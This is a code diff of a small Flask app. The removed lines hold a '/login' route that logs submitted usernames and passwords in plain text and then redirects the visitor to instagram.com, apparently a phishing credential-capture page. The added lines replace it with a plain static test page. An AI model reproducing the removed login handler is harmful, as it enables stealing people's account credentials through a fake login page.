@@ -1,23 +1,21 @@
-from flask import Flask, render_template, request , redirect
+from flask import Flask
 
 app = Flask(__name__)
 
-@app.route('/')
+@app.route("/")
 def index():
-    return render_template("indext.html")
+    return """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Test</title>
+    </head>
+    <body style="background:white;">
+        <h1 style="color:black;">FLASK TEST</h1>
+    </body>
+    </html>
+    """
 
-@app.route('/login', methods=['POST'])
-def login():
-    username = request.form.get('username')
-    password = request.form.get('password')
-
-    print(50*"=")
-    print(f"USER : {username}")
-    print(f"PASSWORD : {password}")
-    print(50*"=")
-
-    return redirect("https://www.instagram.com")
-
-
-if __name__ == '__main__':
-    app.run(host="0.0.0.0")
+if __name__ == "__main__":
+    app.run()
